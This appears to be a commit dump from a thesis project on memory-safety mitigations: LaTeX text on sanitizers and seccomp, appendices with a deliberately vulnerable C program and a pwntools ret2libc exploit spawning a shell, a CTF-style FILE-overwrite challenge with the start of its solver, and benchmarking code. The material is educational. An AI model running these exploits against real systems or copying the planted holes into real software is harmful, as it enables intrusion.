-stack, any discrepancies with the untouched shadow stack will immediately be
-flagged. Despite the operational complexities and slight runtime overheads they
-may introduce, shadow stacks serve as a remarkably effective mitigation
-strategy, enhancing the integrity of the control-flow beyond what is achievable
-with stack canaries alone.
-
-The security and performance implications of shadow stacks are discussed in depth
-in \ref{shadow stacks}
-
-Compile TCC here with shadow steck and show perf diff.
-
-\subsection{Sanitizers}
-With the increasing amount of memory errors happening in unsafe system's programming
-languages such as C and C++, methods for detecting runtime errors without requiring
-code changes have been developed. Even though they are rarely used in production
-environments they have seen massive success when used in conjunction with fuzzers
-\ref{vezi niste paperuri de fuzzere} to detect severe vulnerabilities in really
-large code bases.
-
-\subsubsection{UBSAN}
-UBSAN (Undefined Behavior Sanitizer) injects additional checks during the compilation of
-the program in order to detect Undefined Behaviour\footnote{explain this}. Here is a
-non-exhaustive list of the features and checks UBSAN does:
-
-\begin{itemize}
-  \item Array subscript out of bounds, where the bounds can be statically determined
-  \item Bitwise shifts that are out of bounds for their data type
-  \item Dereferencing misaligned or null pointers
-  \item Signed integer overflow
-  \item Conversion to, from, or between floating-point types which would overflow the destination
-\end{itemize}
-
-Give example with shellcode example not vorking
-
-Compile TCC with and without ubsan(pls god work)
-
-\subsubsection{Seccomp}
-Seccomp (or Secure Computing) was introduced in the 2.6.12 version of the
-Linux kernel. At that time it provided a \emph{strict} execution mode for
-processes that allowed a very limited set of system calls. The intention
-behind this mode was to allow untrusted code to run on systems. This
-functionality was greatly enhanced with the introduction of seccomp-bpf
-(Berkeley Packet Filter) in version 3.5 of the kernel. This new mode of
-operation allowed programmers to filter the systemcalls a process makes
-using small programs written in a DSL. This functionality sees proeminent
-use in projects where the security of the host system is paramount, such as
-Docker, Chrome or Firefox.
-
-Here\ref{codubun} is an example of the granular control seccomp can achieve.
-Note that once a process install a seccomp filter it is impossible to remove
-it without exploiting the kernel, while also being inherited by all child
-processes of the filtered process.
-
-show example of mitigations adding new vulnerabilities (jit attack)
+As expected, the more mitigations and sanitizers are added, the slower the execution time becomes.
+
 \section{Economic impact}%
-Now that the performance impact of the mitigations has been established, we
-will take a look at the economic/financial impact of the exploits these
-mitigations are trying to prevent.
-
-The domain of blockchain has emerged as one of the most publicised arenas for
-software exploitation in recent years. As a technology built upon the principles
-of decentralization and cryptography, blockchain applications, especially
-cryptocurrencies, have attracted significant attention from both ethical and
-malicious actors. The incentive for exploiting these systems is often financial
-gain, given the tangible real-world value of many digital assets. Smart contract
-vulnerabilities, insecure wallets, and compromised blockchain platforms have led
-to numerous notable breaches. This highlights the critical importance of
-rigorous security practices in the design, implementation, and operation of
-blockchain-based systems. Multiple publications estimated that in 2022 alone
-4 billion dollars have were stolen.
-
-Ransomware has also emerged as a significant threat in the software exploitation
-arena, causing extensive harm primarily through service disruptions. Beyond
-direct financial loss from ransoms, these attacks result in considerable
-operational downtime and ensuing economic damage. Consequently, the real impact
-of ransomware extends beyond the immediate ransom, emphasizing the necessity of
-comprehensive security measures and incident response strategies.
+Now that the performance impact of the mitigations has been established, we will look at the economic/financial impact of the exploits these mitigations are trying to prevent.
+In recent years, the blockchain domain has emerged as one of the most publicized arenas for software exploitation.
+
+As a technology built upon the principles of decentralization and cryptography, blockchain applications, especially cryptocurrencies, have attracted significant attention from ethical and malicious actors.
+Given the tangible real-world value of many digital assets, the incentive for exploiting these systems is often financial gain.
+Smart-contract vulnerabilities, insecure wallets, and compromised blockchain platforms have led to numerous notable breaches, highlighting the critical importance of rigorous security practices in designing, implementing, and operating blockchain-based systems.
+Multiple publications estimated that in 2022 alone, 4 billion dollars were stolen.
+Ransomware has also emerged as a significant threat in the software exploitation arena, causing extensive harm primarily through service disruptions.
+
+Beyond direct financial loss from ransoms, these attacks result in considerable operational downtime and economic damage.
+Consequently, the real impact of ransomware extends beyond the immediate ransom, emphasizing the necessity of comprehensive security measures and incident response strategies.
 
 \section{Future trends}%
-Despite the recent shift in focus of threat actors towards exploiting the human
-element -- the "weakest link" in the security chain -- through strategies such
-as SIM swapping, targeted phishing attacks or weak passwords, it is crucial to
-not diminish our emphasis on fortifying software against more technical
-exploits. While these social engineering attacks have grown due to the
-escalating complexity required to execute successful software exploits, they
-should not detract from our progress in securing our software systems. The
-mitigations that we have developed and deployed over the years have provided a
-substantial defensive advantage in the realm of software exploitation. As the
-future unfolds, maintaining this advantage will be of paramount importance, even
-as we also strive to improve defenses against human-targeted
-exploits.
+Despite the recent shift in focus of threat actors towards exploiting the human element -- the "weakest link" in the security chain -- through strategies such as SIM swapping, targeted phishing attacks, or weak passwords, it is crucial not to diminish our emphasis on fortifying software against more technical exploits.
+While these social engineering attacks have grown due to the escalating complexity required to execute successful software exploits, they should not detract from our progress in securing our software systems.
+Thgge mitigations we have developed and deployed over the years have provided a substantial defensive advantage in software exploitation.
+As the future unfolds, maintaining this advantage will be paramount, even as we strive to improve defenses against human-targeted exploits.
 
@@
 \printbibliography
+
+\begin{appendices}
+\section{Buffer overflow vulnerable program}
+\begin{lstlisting}[label={lst:bof-sample}
+      ,language=C]
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+/* This function is a gadget typically
+ * found through Return Oriented Programming (ROP)
+ * in a larger binary, and it's crucial
+ * for changing control flow.
+ * It serves to demonstrate the general
+ * concept in this simplified context.
+ *
+ * In a real-life scenario,
+ * it would be necessary to find this gadget
+ * or pivot the stack in a different manner.
+ */
+extern void __attribute__((naked)) helper_gadget() {
+        __asm(".intel_syntax noprefix\n"
+              "jmp rsp\n"
+              ".att_syntax\n");
+}
+
+/* Example of a vulnerable function in which
+ * the size of the concatenated strings is not
+ * checked to be less than the size of the
+ * buffer in which they are concatenated.
+ *
+ * This would most likely never cause issues
+ * because names are almost never this long, but
+ * it is easy for an attacker to exploit this.
+ */
+void say_hi(char* name) {
+        char local_buffer[0x100];
+
+        strcat(local_buffer, "Hi ");
+        strcat(local_buffer, name);
+        strcat(local_buffer, "!");
+
+        puts(local_buffer);
+
+        return;
+}
+
+int main(int argc, char** argv) {
+        if (argc != 2) {
+                fprintf(stderr, "usage: say_hi <name>\n");
+                return 1;
+        }
+
+        say_hi(argv[1]);
+
+        return 0;
+}
+\end{lstlisting}
+
+\section{Stack layout protection sample code}
+\begin{lstlisting}[
+      label={lst:stack-layout}
+      ,language=C]
+#include <string.h>
+extern void dont_optimize_str(char* ptr);
+extern void dont_optimize_int(int* ptr);
+
+int buffer_first(char* source) {
+    char dest[0x100];
+    int len;
+    int foo;
+    int bar;
+
+    strcpy(dest, source);
+    len = strlen(dest);
+    foo = len * 2;
+    bar = len - 3;
+
+    dont_optimize_str(dest);
+    dont_optimize_int(&len);
+    dont_optimize_int(&foo);
+    dont_optimize_int(&bar);
+}
+
+int buffer_last(char* source) {
+    int len;
+    int foo;
+    int bar;
+    char dest[0x100];
+
+    strcpy(dest, source);
+    len = strlen(dest);
+    foo = len * 2;
+    bar = len - 3;
+
+    dont_optimize_str(dest);
+    dont_optimize_int(&len);
+    dont_optimize_int(&foo);
+    dont_optimize_int(&bar);
+}
+\end{lstlisting}%
+\label{code:example_func}
+
+\section{Pwntools ret2libc example}
+\begin{lstlisting}[language={Python},label={lst:pwntools}]
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+exe = context.binary = ELF('ret2libc')
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+with start() as io:
+    io.recvuntil(b": ")
+    puts_addr = int(io.recvline().strip()[2:], 16)
+
+    log.info(f"{puts_addr=:016x}")
+
+    libc.address = puts_addr - libc.symbols["puts"]
+
+    log.info(f"{libc.address=:016x}")
+
+    rop = ROP(libc)
+    ret_address = rop.ret
+    rop.call(ret_address)
+    rop.call("system", (next(libc.search(b"sh\x00")),))
+
+    payload = b""
+    payload = payload.ljust(0x108, b"\x00")
+    log.info(rop.dump())
+    payload += rop.chain()
+
+    io.sendline(payload)
+
+    io.interactive()
+\end{lstlisting}
+
+\section{Seccomp filtered shellcode}
+\begin{lstlisting}[language={C},label={lst:seccomp}]
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h>
+#include <seccomp.h>
+#include <unistd.h>
+
+extern void __attribute__((naked)) helper_gadget() {
+        __asm(".intel_syntax noprefix\n"
+              "jmp rsp\n"
+              ".att_syntax\n");
+}
+
+void say_hi() {
+        char local_buffer[0x100];
+
+        read(0, local_buffer, 0x300);
+        write(1, local_buffer, 0x300);
+
+        return;
+}
+
+int main(int argc, char** argv) {
+        scmp_filter_ctx ctx;
+        int rc = -1;
+
+        /* Create a new filter context */
+        ctx = seccomp_init(SCMP_ACT_KILL);
+        if (ctx == NULL) {
+                return 1;
+        }
+
+        if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 1, SCMP_A0(SCMP_CMP_EQ, 0)) < 0) {
+                return 1;
+        }
+        if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 1, SCMP_A0(SCMP_CMP_EQ, 1)) < 0) {
+                return 1;
+        }
+        if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0) < 0) {
+                return 1;
+        }
+
+        rc = seccomp_load(ctx);
+        if (rc < 0) {
+                return 1;
+        }
+
+        say_hi();
+
+        return 0;
+}
+\end{lstlisting}
+
+\end{appendices}
 \end{document}

### 2023-07-02 fsop/cold_storage.c
final

@@ -1,0 +1,216 @@
+#include <assert.h>
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define ALLOC_SIZE 256
+
+/*
+ * Cold storage
+ *
+ * User can create temporary buckets and write data
+ * to them, but cannot read data
+ *
+ * Two types of storage buckets
+ *   - in memory (malloc)
+ *   - on disk (file*)
+ *
+ * Index bug to allow reading data into a file* struct
+ * Overwrite FILE* structure with user defined data
+ * Leak admin password (flag)
+ */
+
+char admin_password[0x100] = {0};
+
+void __attribute__((constructor)) setup() {
+  assert(setvbuf(stdout, NULL, _IONBF, 0) == 0);
+  assert(setvbuf(stdin, NULL, _IONBF, 0) == 0);
+
+  FILE *fp = fopen("./flag.txt", "r");
+
+  assert(fp != NULL && "Failed to open admin password file");
+
+  unsigned long nchrs =
+      fread(admin_password, 1, sizeof(admin_password) - 1, fp);
+  assert(nchrs > 0 && "Failed to read admin password");
+
+  admin_password[nchrs] = 0;
+
+  fclose(fp);
+}
+
+void __attribute__((destructor)) cleanup() {}
+
+/*
+ * First 8 buckets are file buckets, other 8 are memory buckets
+ */
+
+#define ARRAY_SIZE(X) (sizeof(X) / sizeof(X[0]))
+
+size_t file_buckets = 0;
+size_t mem_buckets = 0;
+
+typedef struct bucket {
+  void *mem;
+  size_t size;
+} bucket_t;
+
+bucket_t buckets[16] = {0};
+
+#define FILE_BUCKETS_FIRST 0
+#define FILE_BUCKETS_LAST 8
+
+#define MEM_BUCKETS_FIRST 8
+#define MEM_BUCKETS_LAST ARRAY_SIZE(buckets)
+
+void create_file_bucket(size_t index) {
+  if (buckets[index].mem == NULL && buckets[index].size == 0) {
+    buckets[index].mem = tmpfile();
+    buckets[index].size = sizeof(FILE);
+    printf("Success!\n");
+  } else {
+    printf("Failed!\n");
+  }
+}
+
+void write_file_bucket(size_t index) {
+  char buf[ALLOC_SIZE] = {0};
+
+  if (buckets[index].mem != NULL && buckets[index].size != 0) {
[…]

### 2023-07-02 fsop/solver.py

@@ -1,0 +1,111 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template ../artifacts/cold_storage --host cold_storage --port 2000
+from pwn import *
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF("./cold_simple")
+# exe = context.binary = ELF("./cold_sanitized")
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+# ./exploit.py GDB HOST=example.com PORT=4141
+host = args.HOST or "chall"
+port = int(args.PORT or 2000)
+
+
+def start_local(argv=[], *a, **kw):
+    """Execute the target binary locally"""
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+
+def start_remote(argv=[], *a, **kw):
+    """Connect to the process on the remote host"""
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+
+def start(argv=[], *a, **kw):
+    """Start the exploit against the target."""
+    if args.LOCAL:
+        return start_local(argv, *a, **kw)
+    else:
+        return start_remote(argv, *a, **kw)
+
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = """
+tbreak *0x{exe.entry:x}
+continue
+""".format(
+    **locals()
+)
+
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+# Arch:     amd64-64-little
+# RELRO:    Full RELRO
+# Stack:    Canary found
+# NX:       NX enabled
+# PIE:      No PIE (0x400000)
+# FORTIFY:  Enabled
+
+CREATE_MEMORY = 1
+WRITE_MEMORY = 2
+READ_MEMORY = 3
+CREATE_FILE = 4
+WRITE_FILE = 5
+
+io = start()
+
[…]

### 2023-07-02 livpageheap/src/lib.rs

@@ -1,0 +1,97 @@
+use std::ops::{BitAnd, Sub};
+
+use libc::{
+    mprotect, munmap, sysconf, MAP_ANONYMOUS, MAP_PRIVATE, PROT_READ, PROT_WRITE, _SC_PAGE_SIZE,
+};
+
+
+static mut PAGE_SIZE: Option<usize> = Option::<usize>::None;
+
+#[ctor::ctor]
+fn init() {
+    let ps = unsafe { sysconf(_SC_PAGE_SIZE) as usize };
+
+    unsafe {
+        PAGE_SIZE = ps.into();
+    };
+
+    #[cfg(debug_prints)]
+    libc_eprintln!("[PageHeap] PageHeapInit with PageSize={ps:4x}");
+}
+
+#[no_mangle]
+pub unsafe extern "C" fn safe_malloc(size: usize) -> *mut core::ffi::c_void {
+    assert!(size as isize >= 0);
+    #[cfg(debug_prints)]
+    libc_eprintln!("[PageHeap] Allocation request {size} bytes");
+    // SAFETY:
+    // PAGE_SIZE is set in the library constructor.
+    // It should always be presend and a power of 2.
+    let ps = unsafe { PAGE_SIZE.expect("PAGE_SIZE to be present") };
+
+    // Create a page aligned allocation that would fit
+    // the desired size
+    let alloc_size = size + 1 + (ps - 1).bitand(!size);
+
+    #[cfg(debug_prints)]
+    println!("Allocating size {alloc_size:16x}");
+
+    let alloc_addr = unsafe {
+        // Allocate an extra guard page and a size page
+        libc::mmap(
+            core::ptr::null_mut(),
+            alloc_size
+                .checked_add(ps * 2)
+                .expect("alloc_size not to overflow"),
+            PROT_READ | PROT_WRITE,
+            MAP_PRIVATE | MAP_ANONYMOUS,
+            -1,
+            0,
+        )
+    };
+
+    assert!(!alloc_addr.is_null(), "MMAP page allocation failed");
+
+    let usable_mem = unsafe { alloc_addr.add(ps) };
+
+    // Write the allocation size so it can be used later to
+    // properly free the pages
+    unsafe {
+        (alloc_addr as *mut usize).write(alloc_size);
+    }
+
+    assert!(
+        unsafe { mprotect(alloc_addr, ps, PROT_READ) } == 0,
+        "Failed to set guard pre-page protection"
[…]

### 2023-07-02 livpageheap/testprogram.c

@@ -1,0 +1,41 @@
+#include <stdio.h>
+#include <stdlib.h>
+
+typedef void(free_fn)(void *ptr);
+typedef void *(malloc_fn)(size_t size);
+
+extern free_fn safe_free;
+extern malloc_fn safe_malloc;
+
+void do_test(malloc_fn my_malloc, free_fn my_free, size_t alloc_size,
+             size_t write_size) {
+  char *alloc = my_malloc(alloc_size);
+  printf("Allocated memory at %p\n", alloc);
+
+  for (size_t i = 0; i < write_size; ++i) {
+    alloc[i] = 'X';
+  }
+  my_free(alloc);
+}
+
+int main() {
+  printf("Enter allocation size: ");
+  fflush(stdout);
+
+  size_t alloc_size = 0;
+  scanf("%zu", &alloc_size);
+
+  printf("Enter write size: ");
+  fflush(stdout);
+  size_t write_size = 0;
+  scanf("%zu", &write_size);
+
+  printf("System alloc:\n");
+  do_test(malloc, free, alloc_size, write_size);
+  printf("Done\n");
+
+  printf("Safe alloc:\n");
+  do_test(&safe_malloc, &safe_free, alloc_size, write_size);
+  printf("Done\n");
+  return 0;
+}

### 2023-07-02 tcc_bench/runner.py

@@ -1,0 +1,317 @@
+from typing import List, Tuple
+import os
+import sys
+import json
+import subprocess
+from tqdm import tqdm
+
+
+GENERATION_FLAGS: List[Tuple[str, List[str]]] = [
+    (
+        "gcc_tcc",
+        [
+            "--cc=gcc",
+            "--extra-cflags=-O2",
+        ],
+    ),
+    (
+        "gcc_tcc_ubsan",
+        [
+            "--cc=gcc",
+            "--extra-cflags=-O2 -fsanitize=undefined",
+            "--extra-ldflags=-fsanitize=undefined",
+        ],
+    ),
+    (
+        "gcc_tcc_nostack",
+        [
+            "--cc=gcc",
+            "--extra-cflags=-O2 -fno-stack-protector",
+        ],
+    ),
+    (
+        "clang_tcc",
+        [
+            "--cc=clang",
+            "--extra-cflags=-O2",
+        ],
+    ),
+    (
+        "clang_tcc_ubsan",
+        [
+            "--cc=clang",
+            "--extra-cflags=-O2 -fsanitize=undefined",
+            "--extra-ldflags=-fsanitize=undefined",
+        ],
+    ),
+    (
+        "clang_tcc_ubsan_min",
+        [
+            "--cc=clang",
+            "--extra-cflags=-O2 -fsanitize=undefined -fsanitize-minimal-runtime",
+            "--extra-ldflags=-fsanitize=undefined -fsanitize-minimal-runtime",
+        ],
+    ),
+    (
+        "clang_tcc_asan",
+        [
+            "--cc=clang",
+            "--extra-cflags=-O2 -fsanitize=address",
+            "--extra-ldflags=-fsanitize=address",
+        ],
+    ),
+    (
+        "clang_tcc_ubsan_asan",
+        [
+            "--cc=clang",
+            "--extra-cflags=-O2 -fsanitize=undefined,address",
+            "--extra-ldflags=-fsanitize=undefined,address",
+        ],
+    ),
+    (
+        "clang_tcc_asan_bounds",
+        [
+            "--cc=clang",
+            "--extra-cflags=-O2 -fsanitize=address,bounds,array-bounds",
+            "--extra-ldflags=-fsanitize=address,bounds,array-bounds",
+        ],
+    ),
+    (
+        "clang_tcc_ubsan_asan_bounds",
+        [
+            "--cc=clang",
+            "--extra-cflags=-O2 -fsanitize=undefined,address,bounds,array-bounds",
[…]

### 2023-07-02 tcc_bench/testfiles/seed_42.c

@@ -1,0 +1,2276 @@
+/*
+ * This is a RANDOMLY GENERATED PROGRAM.
+ *
+ * Generator: csmith 2.4.0
+ * Git version: 92069e4
+ * Options:   -s 42 -o seed_42.c
+ * Seed:      42
+ */
+
+#include "csmith.h"
+
+
+static long __undefined;
+
+/* --- Struct/Union Declarations --- */
+union U0 {
+   const volatile signed f0 : 3;
+   volatile uint8_t  f1;
+   const uint32_t  f2;
+};
+
+/* --- GLOBAL VARIABLES --- */
+static volatile int32_t g_4 = (-6L);/* VOLATILE GLOBAL g_4 */
+static uint8_t g_8 = 254UL;
+static uint64_t g_16[7] = {3UL,3UL,3UL,3UL,3UL,3UL,3UL};
+static int32_t g_22[10] = {2L,2L,2L,2L,2L,2L,2L,2L,2L,2L};
+static int32_t *g_60 = &g_22[9];
+static int8_t g_77 = (-9L);
+static uint8_t g_97 = 0x7FL;
+static uint8_t g_118 = 247UL;
+static int32_t g_119 = 3L;
+static int64_t g_120 = 0L;
+static int32_t g_122[5][9] = {{0x39F508D5L,1L,1L,0x39F508D5L,3L,0x11602922L,0x39F508D5L,0x11602922L,3L},{0x39F508D5L,1L,1L,0x39F508D5L,3L,0x11602922L,0x39F508D5L,0x11602922L,3L},{0x39F508D5L,1L,1L,0x39F508D5L,3L,0x11602922L,0x39F508D5L,0x11602922L,3L},{0x39F508D5L,1L,(-4L),1L,0xE007783CL,0x6A0115AEL,1L,0x6A0115AEL,0xE007783CL},{1L,(-4L),(-4L),1L,0xE007783CL,0x6A0115AEL,1L,0x6A0115AEL,0xE007783CL}};
+static uint32_t g_128 = 0x5D875103L;
+static int32_t **g_140 = (void*)0;
+static int32_t ***g_139 = &g_140;
+static int32_t ****g_138 = &g_139;
[…]

### 2023-07-02 tcc_bench/testfiles/seed_43.c

@@ -1,0 +1,1457 @@
+/*
+ * This is a RANDOMLY GENERATED PROGRAM.
+ *
+ * Generator: csmith 2.4.0
+ * Git version: 92069e4
+ * Options:   -s 43 -o seed_43.c
+ * Seed:      43
+ */
+
+#include "csmith.h"
+
+
+static long __undefined;
+
+/* --- Struct/Union Declarations --- */
+#pragma pack(push)
+#pragma pack(1)
+struct S0 {
+   uint8_t  f0;
+   int64_t  f1;
+   int32_t  f2;
+   uint64_t  f3;
+   uint8_t  f4;
+};
+#pragma pack(pop)
+
+/* --- GLOBAL VARIABLES --- */
+static volatile int32_t g_2 = 0xA2768935L;/* VOLATILE GLOBAL g_2 */
+static volatile int32_t g_3 = (-1L);/* VOLATILE GLOBAL g_3 */
+static volatile int32_t g_4 = 0x260417BEL;/* VOLATILE GLOBAL g_4 */
+static int32_t g_5 = 0x95010F7AL;
+static int16_t g_14[10] = {1L,6L,1L,1L,6L,1L,1L,6L,1L,1L};
+static uint16_t g_16 = 0x0AD8L;
+static uint8_t g_22 = 255UL;
+static uint8_t g_26 = 0UL;
+static uint32_t g_41 = 4294967295UL;
+static volatile uint64_t g_108 = 0x3453D9EB36BD20CCLL;/* VOLATILE GLOBAL g_108 */
+static uint64_t g_111 = 0x69C6BC52267D0EC5LL;
+static const volatile int16_t ** const g_140 = (void*)0;
+static int32_t g_143 = 0x1A92BC7FL;
[…]

### 2023-07-02 tcc_bench/testfiles/seed_44.c

@@ -1,0 +1,1122 @@
+/*
+ * This is a RANDOMLY GENERATED PROGRAM.
+ *
+ * Generator: csmith 2.4.0
+ * Git version: 92069e4
+ * Options:   -s 44 -o seed_44.c
+ * Seed:      44
+ */
+
+#include "csmith.h"
+
+
+static long __undefined;
+
+/* --- Struct/Union Declarations --- */
+struct S0 {
+   signed f0 : 4;
+   volatile unsigned f1 : 9;
+   const signed f2 : 7;
+   volatile signed f3 : 23;
+   const signed f4 : 10;
+};
+
+/* --- GLOBAL VARIABLES --- */
+static int64_t g_10[4][5][7] = {{{(-10L),0x06310FECAFE8B0D1LL,(-10L),(-10L),0x06310FECAFE8B0D1LL,(-10L),(-10L)},{0L,0xFD9D0890515466BCLL,1L,0xFD9D0890515466BCLL,0L,0x6A927213EC752F67LL,0L},{0x06310FECAFE8B0D1LL,(-10L),(-10L),0x06310FECAFE8B0D1LL,(-10L),(-10L),0x06310FECAFE8B0D1LL},{0xAD816F93BD5DE1FCLL,0xFD9D0890515466BCLL,0xAD816F93BD5DE1FCLL,1L,0L,1L,0xAD816F93BD5DE1FCLL},{0x06310FECAFE8B0D1LL,0x06310FECAFE8B0D1LL,0xAEF6E229EDCA8FECLL,0x06310FECAFE8B0D1LL,0x06310FECAFE8B0D1LL,0xAEF6E229EDCA8FECLL,0x06310FECAFE8B0D1LL}},{{0L,1L,0xAD816F93BD5DE1FCLL,0xFD9D0890515466BCLL,0xAD816F93BD5DE1FCLL,1L,0L},{(-10L),0x06310FECAFE8B0D1LL,(-10L),(-10L),(-10L),0xAEF6E229EDCA8FECLL,0xAEF6E229EDCA8FECLL},{0xAD816F93BD5DE1FCLL,1L,0L,1L,0xAD816F93BD5DE1FCLL,0xFD9D0890515466BCLL,0xAD816F93BD5DE1FCLL},{(-10L),0xAEF6E229EDCA8FECLL,0xAEF6E229EDCA8FECLL,(-10L),0xAEF6E229EDCA8FECLL,0xAE
[…]

### 2023-07-02 tcc_bench/testfiles/seed_45.c

@@ -1,0 +1,1281 @@
+/*
+ * This is a RANDOMLY GENERATED PROGRAM.
+ *
+ * Generator: csmith 2.4.0
+ * Git version: 92069e4
+ * Options:   -s 45 -o seed_45.c
+ * Seed:      45
+ */
+
+#include "csmith.h"
+
+
+static long __undefined;
+
+/* --- Struct/Union Declarations --- */
+union U0 {
+   int16_t  f0;
+   int16_t  f1;
+   volatile int32_t  f2;
+   const int32_t  f3;
+};
+
+/* --- GLOBAL VARIABLES --- */
+static volatile int32_t g_2 = 0xBF34FDA0L;/* VOLATILE GLOBAL g_2 */
+static int32_t g_3 = (-1L);
+static int32_t g_7 = 0x8EF6B8F3L;
+static int8_t g_18 = (-9L);
+static int64_t g_19 = 9L;
+static int32_t g_20 = 3L;
+static int32_t g_22 = 0xCF22A1EFL;
+static int16_t g_23 = 1L;
+static uint32_t g_24 = 0xC98072F2L;
+static int16_t g_85 = 1L;
+static int64_t g_87 = (-1L);
+static uint8_t g_91 = 1UL;
+static int8_t g_98[4][8] = {{0x08L,0x08L,0x08L,0x08L,0x08L,0x08L,0x08L,0x08L},{0x08L,0x08L,0x08L,0x08L,0x08L,0x08L,0x08L,0x08L},{0x08L,0x08L,0x08L,0x08L,0x08L,0x08L,0x08L,0x08L},{0x08L,0x08L,0x08L,0x08L,0x08L,0x08L,0x08L,0x08L}};
+static volatile uint8_t g_99 = 0x6CL;/* VOLATILE GLOBAL g_99 */
+static int32_t *g_104 = &g_7;
+static int32_t ** volatile g_106 = &g_104;/* VOLATILE GLOBAL g_106 */
+static uint64_t g_110 = 0UL;
+static volatile int8_t g_120 = 0x9CL;/* VOLATILE GLOBAL g_120 */
+static int16_t g_122 = 0xC7E2L;
+static uint32_t g_123 = 4294967295UL;
[…]

### 2023-07-02 tcc_bench/testfiles/seed_46.c

@@ -1,0 +1,2227 @@
+/*
+ * This is a RANDOMLY GENERATED PROGRAM.
+ *
+ * Generator: csmith 2.4.0
+ * Git version: 92069e4
+ * Options:   -s 46 -o seed_46.c
+ * Seed:      46
+ */
+
+#include "csmith.h"
+
+
+static long __undefined;
+
+/* --- Struct/Union Declarations --- */
+#pragma pack(push)
+#pragma pack(1)
+struct S0 {
+   int8_t  f0;
+   const uint16_t  f1;
+   const int64_t  f2;
+   unsigned f3 : 28;
+   const uint64_t  f4;
+   volatile int16_t  f5;
+   uint16_t  f6;
+   uint16_t  f7;
+   int32_t  f8;
+   volatile int64_t  f9;
+};
+#pragma pack(pop)
+
+struct S1 {
+   unsigned f0 : 25;
+};
+
+union U2 {
+   const uint32_t  f0;
+   int8_t  f1;
+   const int8_t  f2;
+   unsigned f3 : 21;
+   volatile uint8_t  f4;
+};
+
+/* --- GLOBAL VARIABLES --- */
+static int32_t g_8[6] = {(-4L),(-4L),(-4L),(-4L),(-4L),(-4L)};
+static int32_t g_15 = 0x5E53494AL;
+static int8_t g_16 = 7L;
+static volatile struct S1 g_61 = {4028};/* VOLATILE GLOBAL g_61 */
+static int16_t g_65 = 0xE44EL;
+static struct S0 g_82 = {0xA4L,0x5445L,-1L,11942,18446744073709551611UL,0L,0x5513L,0xC5FDL,0x384E0590L,1L};/* VOLATILE GLOBAL g_82 */
+static int8_t g_83 = 8L;
+static int64_t g_85 = 0xBF48DF11712D94B8LL;
+static uint16_t g_87 = 0xADB2L;
+static uint8_t g_103 = 0x99L;
+static uint32_t g_106 = 4294967295UL;
+static uint8_t g_111 = 255UL;
[…]

### 2023-07-02 tcc_bench/testfiles/seed_48.c

@@ -1,0 +1,1521 @@
+/*
+ * This is a RANDOMLY GENERATED PROGRAM.
+ *
+ * Generator: csmith 2.4.0
+ * Git version: 92069e4
+ * Options:   -s 48 -o seed_48.c
+ * Seed:      48
+ */
+
+#include "csmith.h"
+
+
+static long __undefined;
+
+/* --- Struct/Union Declarations --- */
+#pragma pack(push)
+#pragma pack(1)
+struct S0 {
+   const uint64_t  f0;
+   volatile signed f1 : 19;
+   uint32_t  f2;
+};
+#pragma pack(pop)
+
+/* --- GLOBAL VARIABLES --- */
+static int32_t g_4 = 0L;
+static volatile int32_t g_105 = (-4L);/* VOLATILE GLOBAL g_105 */
+static int32_t g_106[10] = {(-8L),(-8L),(-8L),(-8L),(-8L),(-8L),(-8L),(-8L),(-8L),(-8L)};
+static volatile int32_t * volatile * volatile g_107 = (void*)0;/* VOLATILE GLOBAL g_107 */
+static int16_t g_128 = 1L;
+static struct S0 g_129 = {0UL,-315,4294967295UL};/* VOLATILE GLOBAL g_129 */
+static uint64_t g_141 = 18446744073709551609UL;
+static volatile int64_t g_211 = 7L;/* VOLATILE GLOBAL g_211 */
+static uint16_t g_249[5][4] = {{0UL,65535UL,0x0379L,0x0379L},{0x24F8L,0x24F8L,0UL,0x0379L},{0UL,65535UL,0UL,0UL},{0UL,0UL,0UL,0UL},{0x24F8L,0UL,0x0379L,0UL}};
+static uint16_t * const g_248 = &g_249[2][2];
+static int64_t g_250 = 0xF908FA464EB96B6ALL;
+static int64_t g_278 = 0x0944CA479C7857CBLL;
+static const int32_t g_300 = 6L;
+static const uint32_t *g_326 = (void*)0;
+static volatile struct S0 g_335 = {0xC03A26973638035FLL,-187,0UL};/* VOLATILE GLOBAL g_335 */
[…]

### 2023-07-02 tcc_bench/testfiles/seed_49.c

@@ -1,0 +1,1233 @@
+/*
+ * This is a RANDOMLY GENERATED PROGRAM.
+ *
+ * Generator: csmith 2.4.0
+ * Git version: 92069e4
+ * Options:   -s 49 -o seed_49.c
+ * Seed:      49
+ */
+
+#include "csmith.h"
+
+
+static long __undefined;
+
+/* --- Struct/Union Declarations --- */
+#pragma pack(push)
+#pragma pack(1)
+struct S0 {
+   uint16_t  f0;
+   volatile uint32_t  f1;
+   int32_t  f2;
+   volatile int64_t  f3;
+   uint16_t  f4;
+   volatile uint32_t  f5;
+};
+#pragma pack(pop)
+
+union U1 {
+   int32_t  f0;
+   int32_t  f1;
+   const volatile int32_t  f2;
+   int64_t  f3;
+};
+
+union U2 {
